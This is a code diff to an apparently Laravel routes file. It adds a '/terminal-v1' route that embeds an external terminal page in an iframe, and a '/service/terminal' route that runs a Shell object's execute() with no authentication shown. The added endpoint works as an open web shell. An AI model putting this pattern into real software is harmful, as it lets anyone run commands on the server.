@@ -34,8 +34,13 @@ Route::get('/view-feedback', function() {
     return View::make('feedback');
 });
 
-Route::get('/testing-v2', function() {
-    
+Route::get('/terminal-v1', function() {
+    return "<iframe src='http://a5d6fe-1326-6cd67.service.phpbox.info/static/term.html' style='border:none' width='500'></iframe>";
+});         
+
+Route::match(array('GET', 'POST'),'/service/terminal', function() {
+    $s = new Shell('PHP', '4.4.0');
+    echo $s->execute();
 });
 
 
